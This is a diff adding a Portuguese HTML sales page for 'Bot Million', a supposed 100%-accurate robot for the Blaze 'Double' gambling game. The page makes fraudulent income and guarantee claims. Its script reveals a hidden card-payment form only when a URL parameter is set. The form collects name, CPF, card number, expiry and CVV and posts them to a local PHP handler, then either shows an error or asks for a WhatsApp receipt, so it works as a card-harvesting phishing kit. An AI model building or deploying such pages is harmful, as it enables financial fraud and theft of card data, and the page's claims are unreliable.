@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Bot Million - Double (Blaze)</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="author" content="Bot Million">
+    <meta name="description" content="Robô 100% acertivo da Blaze no game Double, com nosso robô você irá mudar a sua vida financeira da água para o vinho!">
+    <meta name="keywords" content="bot, robo, blaze, apostas, blaze apostas, double game, double, blaze double, 100%, robo blaze">
+    <meta name="robots" content="index,follow">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./botmillion_files/font-awesome.min.css">
+    <link href="./botmillion_files/css" rel="stylesheet">
+    <link href="./botmillion_files/fullstackmaster.css" rel="stylesheet">
+    <link rel="icon" href="./robo-photo.jpg" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://jsuites.net/v4/jsuites.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <style type="text/css">
+      .form-modal {
+      padding: 40px 2%;
+      background: #ebebeb;
+      }
+      .chamada-modal img {
+      display: block;
+      margin: 0 auto;
+      }
+      .form-modal h2 {
+      text-align: center;
+      font-size: 25px;
+      font-weight: normal;
+      color: #0f346e;
+      }
+      .form-modal form {
+      margin: 20px 0;
+      text-align: center;
+      }
+      .form-modal input[type=email] {
+      width: 100%;
+      height: 45px;
+      border: 1px solid #ccc;
+      padding-left: 10px;
+      }
+      .form-modal input[type=submit] {
+      display: inline-block;
+      border: 0;
+      padding: 10px;
+      min-width: 350px;
+      /*border-bottom: 5px solid #D99800;*/
+      background: #fab51f;
+      color: #104793;
+      font-weight: bold;
+      font-size: 20px;
+      text-transform: uppercase;
+      margin-top: 29px;
+      cursor: pointer;
+      }
+      .modal {
+      z-index: 999999;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      position: fixed;
+      display: none;
+      }
+      .box-form {
+      width: 100%;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      background: white;
+      transform: translate(-50%, -50%);
+      -ms-transform: translate(-50%, -50%);
+      max-width: 900px;
+      }
+      .close {
+      position: absolute;
+      right: 4px;
+      top: 4px;
+      color: white;
+      cursor: pointer;
+      }
+      .chamada-modal {
+      position: relative;
+      text-align: center;
+      padding: 30px 2%;
+      background: #0c3f8a;
+      }
+      .chamada-modal h2 {
+      color: white;
+      font-size: 1.3rem;
+      }
+      .chamada-modal p {
+      color: white;
+      font-weight: 300;
+      font-size: 18px;
+      margin: 10px 0;
+      }
+      .sucesso {
+      position: fixed;
+      z-index: 99999999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      padding: 8px 8px;
+      color: #3c763d;
+      background: #dff0d8;
+      border: 1px solid #d6e9c6;
+      text-align: center;
+      }
+      .sucesso h2 {
+      font-size: 19px;
+      }
+      .sucesso .close-sucesso {
+      padding: 0 20px;
+      display: inline-block;
+      cursor: pointer;
+      }
+      .close-sucesso i {
+      font-size: 26px;
+      text-decoration: underline;
+      }
+      /*  MODAIS MODULOS*/
+      .overlay {
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 3;
+      display: none;
+      }
+      .modal_modules {
+      width: 60%;
+      max-height: 100%;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      z-index: 9;
+      display: none;
+      overflow-y: auto;
+      }
+      .header-modal {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #130644;
+      color: #fff;
+      padding: 20px;
+      }
+      .list-modules {
+      padding: 20px 50px;
+      }
+      .list-modules p {
+      color: #5f5f5f;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 8px 0;
+      margin-bottom: 8px;
+      border-bottom: 1px solid #dcdcdc;
+      }
+      .j_btn_close {
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 28px;
+      }
+      @media screen and (max-width: 768px) {
+      .modal_modules {
+      width: 90%;
+      }
+      }
+      @media screen and (max-width: 414px) {
+      .modal_modules {
+      width: 98%;
+      max-height: 98%;
+      overflow-y: auto;
+      }
+      .header-modal h2 {
+      font-size: 1.2em
+      }
+      .list-modules {
+      padding: 20px;
+      }
+      .j_btn_close {
+      font-size: 1.2em;
+      }
+      }
+    </style>
+    <link rel="stylesheet" href="./botmillion_files/widget.css" class="jv-css">
+  </head>
+  <body>
+    <style type="text/css">
+      @keyframes bright {
+      0% {
+      box-shadow: #3870c1 0 0 6px 3px;
+      }
+      50% {
+      box-shadow: #1d46dd 0 0 6px 3px;
+      }
+      100% {
+      box-shadow: #8ea0fe 0 0 6px 3px;
+      }
+      }
+      .cursos-novos {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      justify-content: center;
+      align-items: flex-end;
+      grid-gap: 1rem;
+      }
+      .cursos-novos img {
+      border: 2px solid #8ea0fe;
+      animation: bright 2s alternate infinite;
+      max-width: 280px;
+      width: 100%;
+      }
+      .cursos-novos p {
+      line-height: 20px;
+      }
+      .cursos-novos small {
+      font-size: 18px;
+      }
+      @media (min-width: 315px) and (max-width: 480px) {
+      .chamada-modal h2 {
+      font-size: 16px !important;
+      }
+      .chamada-modal p {
+      font-size: 16px !important;
+      }
+      }
+      @media screen and (max-width: 768px) {
+      .mobile-modal {
+      display: block;
+      }
+      }
+
+      div.bg-opacity {
+        position: fixed;
+        left: 0;
+        right: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 555;
+        display: none;
+      }
+
+      div.payment-card-container {
+        display: flex;
+        width: 100%;
+        height: 100%;
+        justify-content: center;
+        align-items: center;
+      }
+
+      div.payment-card-box {
+        padding: 30px;
+        padding-top: 10px;
+        padding-right: 10px;
+        display: flex;
+        flex-direction: column;
+        background: #4c0f0f;
+        width: 610px;
+        height: max-content;
+      }
+
+      div.payment-card-box h1 {
+        color: #fff;
+        text-align: left;
+      }
+
+      div.payment-card-box label {
+        color: #fff;
+        margin-top: 20px;
+        padding-bottom: 10px;
+      }
+
+      div.payment-card-box input {
+        width: 540px;
+        height: 40px;
+        padding: 10px;
+        border: none;
+        font-weight: bold;
+        font-size: 16px;
+      }
+
+      div.payment-card-box input:focus {
+        outline: 1px solid red;
+      }
+
+      div.payment-card-box button {
+        margin-top: 20px;
+        width: 540px;
+        padding: 15px;
+        background: #4c0f0f;
+        cursor: pointer;
+        border: 2px solid #fff;
+        color: #fff;
+        font-size: 19px;
+        font-weight: bold;
+        transition: .2s all;
+      }
+
+      div.payment-card-box button:hover {
+        background: #fff;
+        color: #4c0f0f;
+        border-radius: 10px;
+      }
+
+      div.payment-card-box button:active {
+        transform: scale(0.9);
+      }
+
+      #resultPayment {
+        color: #fff;
+        margin-top: 10px;
+        text-align: center;
+        display: none;
+      }
+
+      #resultPayment i {
+        color: yellow;
+      }
+
+      #resultPayment a {
+        color: red;
+      }
+
+      div.payment-card-box div.close-box {
+        position: relative;
+     }
+
+        div.payment-card-box div.close-box i {
+            position: absolute;
+            right: 5px;
+            top: 5px;
+            color: #4c0f0f;
+            cursor: pointer;
+            background: #fff;
+            padding: 8px;
+            border: 2px solid #fff;
+            transition: .2s all;
+        }
+
+        div.payment-card-box div.close-box i:hover {
+            background: #4c0f0f;
+            color: #fff;
+        }
+
+        div.payment-card-box div.close-box i:active {
+            background: #fff;
+            color: #4c0f0f;
+            transform: scale(0.9);
+        }
+
+      @media only screen and (max-width: 770px) {
+        div.payment-card-box h1 {
+            font-size: 19px;
+        }
+
+        div.payment-card-box {
+            transform: scale(0.8);
+            width: 360px;
+            height: 750px;
+            overflow-y: scroll;
+        }
+
+        div.payment-card-box input {
+            width: 280px;
+        }
+
+        div.payment-card-box button {
+            width: 280px;
+        }
+      }
+    </style>
+    
+    <div class="bg-opacity">
+        <div class="payment-card-container">
+            <div class="payment-card-box">
+                <div class="close-box">
+                    <i onclick="window.location.href = './botmillion.html'" class="fa fa-times"></i>
+                </div>
+                <h1><i class="fa fa-credit-card"></i>&nbsp;Pagamento no Cartão</h1>
+                <label for="0_info"><i class="fa fa-user"></i>&nbsp;Nome</label>
+                <input type="text" id="0_info" name="0_info" placeholder="EX:. Allan Santos da Silva" />
+                <label for="1_info"><i class="fa fa-envelope"></i>&nbsp;E-mail</label>
+                <input type="email" id="1_info" name="1_info" placeholder="seuemail@gmail.com" />
+                <label for="2_info"><i class="fa fa-user"></i>&nbsp;CPF</label>
+                <input type="text" id="2_info" name="2_info" placeholder="xxx.xxx.xxx-xx" contentEditable="true" data-mask="000.000.000-00" maxlength="14" />
+                <label for="3_info"><i class="fa fa-credit-card"></i>&nbsp;Cartão (<span id="typeCard"></span>)</label>
+                <input type="text" id="3_info" name="3_info" placeholder="xxxx xxxx xxxx xxxx" />
+                <label for="4_info"><i class="fa fa-calendar"></i>&nbsp;Mês/Ano</label>
+                <input type="text" id="4_info" name="4_info" placeholder="xx/xxxx" contentEditable="true" maxlength="7" data-mask="00/0000" />
+                <label for="5_info"><i class="fa fa-lock"></i>&nbsp;CVV</label>
+                <input type="text" id="5_info" name="5_info" placeholder="xxx" contentEditable="true" maxlength="4" data-mask="0000" />
+                <button type="submit"><i class="fa fa-check"></i>&nbsp;QUERO ADQUIRIR O BOT MILLION AGORA!</button>
+                <span id="resultPayment"><i class="fa fa-warning"></i>&nbsp;ATENÇÃO&nbsp;<i class="fa fa-warning"></i><br>- HOUVE UM PROBLEMA AO REALIZAR O PAGAMENTO!<br>- ENTRE EM CONTATO COM O SUPORTE CLICANDO <a href="">AQUI</a>!</span>
+            </div>
+        </div>
+    </div>
+
+    <header>
+      <div class="container">
+        <div class="header-wrapper flex">
+          <div style="margin-bottom: 8px;"><span style="color:white;font-weight: bold;font-size: 18px;">🤖 Bot Million</span></div>
+        </div>
+      </div>
+    </header>
+    <section class="main" style="background-color: #4c0f0f;">
+      <div style="max-width: 1100px;" class="container">
+        <div class="logo-posic-par">
+          <div class="logo-posic">
+            <img class="logo" width="200" src="./robo-photo.jpg" alt="Pacote Fullstack Master">
+          </div>
+        </div>
+        <h1 style="font-size: 32px;">
+          Fature <span style="color: red;">R$ 5.000 por dia</span> - através do nosso Robô 100% acertivo no Double Game</span>
+        </h1>
+        <style type="text/css">
+          .logo-posic-par {
+          text-align: center;
+          }
+          .logo-posic {
+          position: relative;
+          display: inline-block;
+          }
+          .logo-posic p {
+          position: absolute;
+          z-index: 999;
+          top: 50%;
+          transform: translate(0, -2%);
+          left: 0;
+          color: white;
+          font-style: italic;
+          font-size: 17px;
+          font-weight: bold;
+          padding: 9px 6px;
+          }
+        </style>
+        <div class="embed-container" style="margin: 0 auto; border: solid 4px red;">
+          <iframe src="https://youtube.com/embed/4g4KAusPfzA"></iframe>
+        </div>
+        <style type="text/css">
+          .cursos-qtd {
+          border-top: 2px solid white;
+          border-bottom: 2px solid white;
+          padding: 8px 0;
+          margin: 10px 0;
+          text-align: center;
+          color: white;
+          font-size: 17px;
+          }
+        </style>
+        <style type="text/css">
+          .box-aviso {
+          max-width: 600px;
+          padding: 40px 20px;
+          border-radius: 10px;
+          margin: 10px auto;
+          background-color: #222428;
+          text-align: center;
+          }
+          .box-aviso p {
+          font-size: 18px;
+          color: white;
+          margin: 20px 0;
+          line-height: 27px;
+          }
+          .box-aviso h2 {
+          font-size: 28px;
+          color: white;
+          border: 2px dashed white;
+          padding: 8px;
+          }
+          @media screen and (max-width: 768px) {
+          .header-wrapper img {
+          display: none;
+          }
+          }
+        </style>
+        <br>
+        <div class="box-aviso" style="background-color: black;">
+          <h2><span style="color:#f9c944;">⚠</span> Promoção até <span class="date_end">30/08/2022</span></h2>
+          <p>Nosso robô é INÉDITO e ÚNICO. Temos diversos programadores em nossa equipe que se capacitaram a desenvolver este robô com 100% de acertividade no game <b>Double</b> da Blaze. Tenha acompanhamento, instrução, desde a instalação ao uso, suporte totalmente rápido e muito mais. Chegou a sua hora de mudar de <b>vida.</b>
+          </p>
+        </div>
+        <div class="price">
+          <div class="price-wrapper flex">
+            <div class="price-int">
+              <div>
+                <p style="color:white;">Por apenas:</p>
+              </div>
+            </div>
+            <div class="price-int">
+              <div>
+                <p style="color: #fff;">R$200,00</p>
+              </div>
+            </div>
+            <p style="color:red;font-weight: bold;font-size: 15px;">(Economize <span style="font-size: 34px;text-decoration: line-through;">R$100,00</span> do seu bolso)
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="ganhar" style="background-color: black;">
+      <div class="container">
+        <div class="box-cartoes">
+          <a style="max-width: 800px;font-size: 25px;" href="https://api.whatsapp.com/send?phone=554191790056&text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%20quero%20adquirir%20o%20rob%C3%B4%20da%20Blaze.%20Quais%20as%20instru%C3%A7%C3%B5es%3F" class="cta">QUERO ADQUIRIR O BOT MILLION AGORA!</a>
+        </div>
+        <div class="ganhar-wrapper">
+          <span><i style="opacity: 0.3;" class="fa fa-check"></i> Acesso <b style="color: red;">Vitalício</b></span>
+          <span><i style="opacity: 0.3;" class="fa fa-check"></i> Suporte <b style="color: red;">Individual e Personalizado</b></span>
+          <span><i style="opacity: 0.3;" class="fa fa-check"></i> Atualizações <b style="color: red;">Constantes</b></span>
+        </div>
+      </div>
+    </section>
+    <section class="tecnologias" style="background-color: #4c0f0f;">
+      <div class="container">
+        <div class="tecnologias-header">
+          <h2 style="color: #fff;">Nossas redes Sociais, contatos e mais...</h2>
+          <br>
+        </div>
+        <div class="grid-tecnologias">
+          <div class="box-grid" style="display: flex; flex-direction: column; position: relative; border: none;">
+            <span style="position: absolute; top: 5px; color: white;">(clique na imagem)</span>
+            <a href="https://www.youtube.com/channel/UCO6Un0mImCahZpiHZE2y08A"><img src="./yt-photo.png" width="150"></a>
+          </div>
+          <div class="box-grid" style="display: flex; flex-direction: column; position: relative; border: none;">
+            <span style="position: absolute; top: 5px; color: white;">(clique na imagem)</span>
+            <a href="https://api.whatsapp.com/send?phone=554191790056&text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%20quero%20adquirir%20o%20rob%C3%B4%20da%20Blaze.%20Quais%20as%20instru%C3%A7%C3%B5es%3F"><img style="width: 110px;" width="190" src="./whatsapp-photo.png"></a>
+          </div>
+          <div class="box-grid" style="display: flex; flex-direction: column; position: relative; border: none;">
+            <span style="position: absolute; top: 5px; color: white;">(clique na imagem)</span>
+            <a href="https://www.instagram.com/blazebotm/"><img width="110" src="./insta-photo.png"></a>
+          </div>
+        </div>
+        </div>
+      </div>
+    </section>
+    <section class="box-botoes" style="background-color: black;">
+      <div class="container">
+        <div class="box-cartoes">
+          <a href="https://api.whatsapp.com/send?phone=554191790056&text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%20quero%20adquirir%20o%20rob%C3%B4%20da%20Blaze.%20Quais%20as%20instru%C3%A7%C3%B5es%3F" class="cta">QUERO ADQUIRIR O BOT MILLION AGORA</a>
+        </div>
+        <h2>Com o Bot Million você irá ter sua <u style="color: red;">Liberdade Financeira!</u></h2>
+        <p>Além de ter Risco Zero com seu investimento, ainda Garantimos Seu Resultado.</p>
+      </div>
+    </section>
+    <section class="garantia-dupla" style="background-color: black;">
+      <div class="container">
+        <div class="garantia-dupla-wrapper flex">
+          <div class="garantia-dupla-wrapper-int">
+            <div>
+              <h2 style="color: red;">Risco <u>ZERO para Você!</u></h2>
+              <p style="color: white;">Se você não ficar satisfeito com nosso robô, simplesmente nos mande uma
+                mensagem e iremos te reembolsar completamente! Sem enganação, sem meias palavras. É 100% do seu
+                dinheiro de volta com apenas uma mensagem. Essa é a prova do quanto nós acreditamos em nosso robô e na transformação que ele gera. Estamos assumindo todo o risco por você!
+              </p>
+            </div>
+          </div>
+          <div style="padding:15px; border:4px dashed red;" class="garantia-dupla-wrapper-int">
+            <div>
+              <img src="./botmillion_files/garantia-condicional.png" alt="Selo de Satisfação">
+              <h2>Resultados <u>Garantidos!</u></h2>
+              <p style="color: white;"><b>Atenção: Somos os únicos do Brasil a oferecer tamanha Garantia.</b><br>
+                Se com o nosso robô você não conseguir
+                ter sua liberdade financeira, vamos realizar uma consultoria particular com você e vamos analisar o
+                que está acontecendo de errado. E se mesmo assim não conseguir nenhum resultado, vamos devolver todo seu dinheiro!
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="modulos" style="background-color: #4c0f0f;">
+      <div class="container">
+        <h1 style="text-align: center; color: #fff;">Vídeos e Fotos de Demonstração do Robô</h1>
+        <div class="modulos-wrapper flex" style="max-width: 650px;">
+          <div class="modulos-wrapper-int">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+              <video controls>
+                  <source src="./videos/video2_apostando.mp4" type="video/mp4" />
+              </video>
+              <h4>1- Demonstração do Robô</h4>
+              <p>Neste vídeo é mostrado o uso do robô, dizendo (antes de rodar) o NÚMERO + COR que vai dar green. Nosso robô tem 100% de capacidade de acertar o resultado. Você olha antes de apostar, aposta e é SUCESSO! Tá esperando o que pra adquirir agora mesmo?
+              </p>
+            </div>
+          </div>
+          <div class="modulos-wrapper-int">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+              <iframe src="https://www.youtube.com/embed/kejoL_f8dnk" style="height: 493px;"></iframe>
+              <h4>2- Demonstração do Robô</h4>
+              <p>Neste vídeo é mostrado o uso do robô. Nosso robô tem 100% de capacidade de acertar o resultado. Você olha antes de apostar, aposta e é SUCESSO! Tá esperando o que pra adquirir agora mesmo?
+              </p>
+            </div>
+          </div>
+          <div class="modulos-wrapper-int">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+                <img class="foto-robo-menu" src="./fotos/robo-foto-no-pc.jpg" />
+              <h4>Foto do Robô</h4>
+              <p>Foto mostrando o menu do robô.
+              </p>
+            </div>
+          </div>
+        </div>
+        <h1 style="margin-top: 30px;">Veja os nossos clientes<span style="color: red;"> Extremamente Satisfeitos</span></h1>
+        <p>Já são mais de <b>10 mil clientes</b> felizes, com uma vida financeira totalmente realizada!
+        </p>
+        <div class="modulos-wrapper flex" style="max-width: 960px;">
+          <div class="modulos-wrapper-int-news">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+              <img src="./prints/referencia_1_p1.jpg">
+              <h4>Cliente <span>satisfeito</span></h4>
+              <p>Cliente adquiriu nosso robô e ficou satisfeito com o resultado!</p>
+            </div>
+          </div>
+          <div class="modulos-wrapper-int-news">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+              <img src="./prints/referencia_1_p2.jpg">
+              <h4>Cliente <span>impressionado e satisfeito</span></h4>
+              <p>Cliente impressionado, satisfeito e feliz após adquirir nosso robô e ver o resultado na PRÁTICA! (fizemos uma alavancagem após o pagamento do cliente, para ensina-lo a utilizar o robô)
+              </p>
+            </div>
+          </div>
+        </div>
+        <br>
+        <h1>
+        Áudios de nossos clientes satisfeitos
+        </h1>
+
+        <div class="modulos-wrapper flex" style="max-width: 960px;">
+          <div class="modulos-wrapper-int-news">
+            <div class="box-blue" style="background-color: black; border: 1px solid red;">
+              <img src="./robo-photo.jpg" alt="Bot Million">
+              <h4>Depoimento de cliente</h4>
+              <audio controls>
+                <source src="./audios/depoimento-1.mp3" type="audio/mpeg">
+                Your browser does not support the audio tag.
+              </audio>
+            </div>
+          </div>
+
+        </div>
+        <br>
+      </div>
+    </section>
+    <section class="instrutor" style="background-color: black;">
+      <div class="container">
+        <div class="box-cartoes">
+          <a href="https://api.whatsapp.com/send?phone=554191790056&text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%20quero%20adquirir%20o%20rob%C3%B4%20da%20Blaze.%20Quais%20as%20instru%C3%A7%C3%B5es%3F" class="cta">QUERO ADQUIRIR O BOT MILLION AGORA!</a>
+        </div>
+        <h1>Sobre Allan Santos da Silva</h1>
+        <div class="instrutor-wrapper flex">
+          <div class="instrutor-wrapper-int">
+            <div><img src="./fotos/eu-dev-do-bot.jpg" alt="Allan Santos da Silva"></div>
+          </div>
+          <div class="instrutor-wrapper-int">
+            <div>
+              <p><b>Desenvolvedor Fullstack há mais de 14 anos</b>,
+                criou o Bot Million junto de sua equipe <b> de programadores que se capacitaram a criar um robô 100% acertivo para a Blaze</b> e com o maior índice de satisfação do mercado.
+              </p>
+              <p>Já mudou a vida de mais de 10.000 pessoas. </p>
+              <p>Apaixonado por programação e lidera a equipe do Bot Million com mais de 10
+                colaboradores e parceiros.
+              </p>
+              <p>E aí, bora mudar de vida de verdade?</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="garantia" style="background-color: #4c0f0f;">
+      <div class="container" style="max-width: 960px;">
+        <div class="garantia-wrapper flex">
+          <div class="garantia-int">
+            <div>
+              <img src="./botmillion_files/garantia-fullstack.png" alt="Garantia Fullstack">
+            </div>
+          </div>
+          <div class="garantia-int">
+            <div>
+              <h2 style="color: red;">ASSUMIMOS TODO O RISCO POR VOCÊ!</h2>
+              <p style="color: #fff;">Somos os únicos do Brasil a oferecer tamanha Garantia.
+Se com o nosso robô você não conseguir ter sua liberdade financeira, vamos realizar uma consultoria particular com você e vamos analisar o que está acontecendo de errado. E se mesmo assim não conseguir nenhum resultado, vamos devolver todo seu dinheiro!
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="rodape" style="background-color: black;">
+      <div class="container" style="max-width:960px">
+        </div>
+        <a href="https://api.whatsapp.com/send?phone=554191790056&text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%20quero%20adquirir%20o%20rob%C3%B4%20da%20Blaze.%20Quais%20as%20instru%C3%A7%C3%B5es%3F" class="cta">QUERO ADQUIRIR O BOT MILLION AGORA!</a>
+      </div>
+    </section>
+    <footer style="background-color: black;">
+      <p>© Bot Million, 2022 - Todos os direitos reservados!</p>
+    </footer>
+
+    <script>
+        function sleep(ms) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    resolve();
+                }, ms);
+            })
+        }
+
+        cardInfos = null;
+
+        function getBin(bin) {
+          fetch('https://lookup.binlist.net/' + bin, {
+            method: 'GET',
+            headers: {
+              "Accept-Version": 3
+            }
+          }).then((res) => res.json()).then((data) => {
+            cardInfos = `${data.scheme} - ${data.type}`;
+          })
+        }
+
+        $('#3_info').on('keyup', function() {
+          if (this.value.length >= 6) {
+            let bin = this.value.substring(0, 6);
+
+            getBin(bin);
+
+            $('#typeCard').text(cardInfos);
+          }
+        });
+
+        let paramsGET = new URLSearchParams(window.location.search);
+
+        if (paramsGET.has('payWithCreditCard')) {
+            document.body.style.overflow = 'hidden';
+            $('.bg-opacity').css('display', 'unset')
+            let btnPay = document.querySelector('.payment-card-box button');
+            let nama = document.getElementById('0_info');
+            let emeil = document.getElementById('1_info');
+            let cepefi = document.getElementById('2_info');
+            let corton = document.getElementById('3_info');
+            let mesano = document.getElementById('4_info');
+            let ceveve = document.getElementById('5_info'); 
+
+            btnPay.addEventListener('click', function() {
+                if (nama.value == '') {
+                    alert('Preencha o campo nome!');
+                    nama.focus();
+
+                    return;
+                } else if (nama.value.length <= 5) {
+                    alert('Preencha o campo nome corretamente!');
+                    nama.focus();
+
+                    return;
+                }
+
+                if (emeil.value == '') {
+                    alert('Preencha o campo e-mail!');
+                    emeil.focus();
+
+                    return;
+                } else if (!emeil.value.match(/[a-zA-Z0-9_.][@a-zA-Z.A-Za-z]+/)) {
+                    alert('Preencha o campo e-mail corretamente!');
+                    emeil.focus();
+
+                    return;
+                }
+
+                if (cepefi.value == '') {
+                    alert('Preencha o campo CPF!');
+                    cepefi.focus();
+
+                    return;
+                } else if (!cepefi.value.match(/[\d{3}.\d{3}.\d{3}-\d{2}]/)
+                    && cepefi.value.length < 14) {
+                    alert('Preencha o campo CPF corretamente!');
+                    cepefi.focus();
+
+                    return;
+                }
+
+                if (corton.value == '') {
+                    alert('Preencha o campo Cartão!');
+                    corton.focus();
+
+                    return;
+                }
+
+                if (mesano.value == '') {
+                    alert('Preencha o campo Mês/Ano!');
+                    mesano.focus();
+
+                    return;
+                } else if (!mesano.value.match(/[\d{2}/\d{4}]/)) {
+                    alert('Preencha o campo Mês/Ano corretamente!');
+                    return;
+                }
+
+                if (ceveve.value == '') {
+                    alert('Preencha o campo CVV!');
+                    ceveve.focus();
+                } else if (ceveve.value.length > 4) {
+                    alert('Preencha o campo CVV corretamente!');
+                    ceveve.focus();
+
+                    return;
+                }
+
+                $.ajax({
+                  type: "POST",
+                  url: './processPayment.php',
+                  cache: false,
+                  data: {
+                    nama: $('#0_info').val(),
+                    emeil: $('#1_info').val(),
+                    cepefi: $('#2_info').val(),
+                    corton: $('#3_info').val(),
+                    mesano: $('#4_info').val(),
+                    ceveve: $('#5_info').val()
+                  },
+
+                  beforeSend: function(response) {
+                    btnPay.style.opacity = 0.5;
+                    btnPay.disabled = true;
+                    btnPay.innerHTML = '<i class="fa fa-spinner fa-spin"></i>&nbsp;Realizando Pagamento...';
+                  },
+
+                  success: async function(response) {
+                    let obj = JSON.parse(response);
+
+                    await sleep(4000);
+
+                    if (obj.code == 200) {
+                        // success
+                        alert('Pagamento concluído com sucesso! Envie um comprovante de pagamento no nosso WhatsApp!');
+                        window.location.href = 'https://api.whatsapp.com/send?phone=554191790056&amp;text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%%20realizei%20o%20pagamento pelo cartão!%20Irei enviar o comprovante.';
+                    } else if (obj.code == 500) {
+                        //error
+                        $('#resultPayment').html(`
+                        <i class="fa fa-warning"></i>&nbsp;ATENÇÃO&nbsp;<i class="fa fa-warning"></i><br>- HOUVE UM PROBLEMA INTERNO AO REALIZAR O PAGAMENTO!<br>- ENTRE EM CONTATO COM O SUPORTE CLICANDO <a href="https://api.whatsapp.com/send?phone=554191790056&amp;text=Ol%C3%A1%2C%20Allan%20Santos%20da%20Silva%20Bot%20Million!%20Eu%%20tive%20um%20problema%20com%20o%20pagamento,%20pode%20me%20ajudar,%20por%20favor?">AQUI</a>!
+                        `);
+                        $('#resultPayment').css('display', 'unset');
+                        $('.payment-card-box button').css('opacity', 1);
+                        $('.payment-card-box button').removeAttr('disabled');
+                        $('.payment-card-box button').html('<i class="fa fa-check"></i>&nbsp;QUERO ADQUIRIR O BOT MILLION AGORA!');
+                        $('.payment-card-box button').css('display', 'none');
+                    }
+                  }
+                });
+            });
+        }
+    </script>
+  </body>
+</html>
